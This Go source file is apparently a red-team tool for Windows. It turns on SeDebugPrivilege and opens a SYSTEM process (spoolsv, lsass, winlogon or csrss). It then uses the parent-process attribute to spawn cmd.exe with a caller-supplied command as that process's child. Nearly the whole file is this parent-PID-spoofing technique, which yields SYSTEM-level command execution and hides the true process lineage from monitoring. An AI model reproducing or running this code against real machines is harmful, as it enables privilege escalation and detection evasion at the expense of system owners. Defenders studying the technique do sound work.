package main

import (
	"fmt"
	"github.com/D00MFist/Go4aRun/pkg/sliversyscalls/syscalls"
	wins "github.com/cloudfoundry/gosigar/sys/windows"
	"golang.org/x/sys/windows"
	"log"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	ps "github.com/mitchellh/go-ps"
)

func getpid(pname []string) int {
	target_procs := pname
	processList, err := ps.Processes()
	if err != nil {
		fmt.Println("ps.Processes() Failed, are you using windows?")
		return 0
	}
	for _,proc := range target_procs {
		for x := range processList {
			var process ps.Process
			process = processList[x]
			if strings.Contains(process.Executable(), proc) {
				return process.Pid()
			} else {
				// sleep to limit cpu usage
				time.Sleep(5 * time.Millisecond)
			}

		}
	}
	return 0
}

func enableSeDebugPrivilege() error {
	self, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}

	var token syscall.Token
	err = syscall.OpenProcessToken(self, syscall.TOKEN_QUERY|syscall.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		return err
	}

	if err = wins.EnableTokenPrivileges(token, wins.SeDebugPrivilege); err != nil {
		return err
	}

	return nil
}

func main(){
	var cmdArgs *uint16
	if len(os.Args) == 2{
		cmdline := os.Args[1]
		cmdArgs, _ = syscall.UTF16PtrFromString("/c "+cmdline)

	}else{
		cmdArgs, _ = syscall.UTF16PtrFromString("")
	}

	target := "C:\\Windows\\System32\\cmd.exe"
	commandLine, err := syscall.UTF16PtrFromString(target)

	targetPID := getpid([]string{"spoolsv","lsass","winlogon","csrss"})

	if targetPID == 0{
		fmt.Println("未找到\"spoolsv\",\"lsass\",\"winlogon\",\"csrss\"进程")
		return
	}

	e := enableSeDebugPrivilege()
	if e != nil{
		log.Printf("SeDebugPrivilege failed: %v\n", e)
		return
	}



	procThreadAttributeSize := uintptr(0)
	_ = syscalls.InitializeProcThreadAttributeList(nil, 1, 0, &procThreadAttributeSize)
	//siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
	procHeap, _ := syscalls.GetProcessHeap()
	attributeList, _ := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
	defer syscalls.HeapFree(procHeap, 0, attributeList)
	var startupInfo syscalls.StartupInfoEx
	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))

	_ = syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 1, 0, &procThreadAttributeSize)


	//IntPtr parentHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
	handle, err := syscall.OpenProcess( 0x000000080|0x00000040, false, uint32(targetPID))
	if err != nil{
		log.Printf("OpenProcess failed: %v\n", err)
		return
	}



	lpValueProc := uintptr(handle)
	//UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
	_ = syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(0x00020000), &lpValueProc, unsafe.Sizeof(lpValueProc), 0, nil)

	var procInfo windows.ProcessInformation
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
	//bool ret = CreateProcess(binaryPath, null, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref siEx, out pInfo);
	if err = syscalls.CreateProcess(
		commandLine,
		cmdArgs,
		nil,
		nil,
		true,
		0x00080000|0x00000010,
		nil,
		nil,
		&startupInfo,
		&procInfo);
		err != nil {
		log.Printf("CreateProcess failed: %v\n", err)
	}

}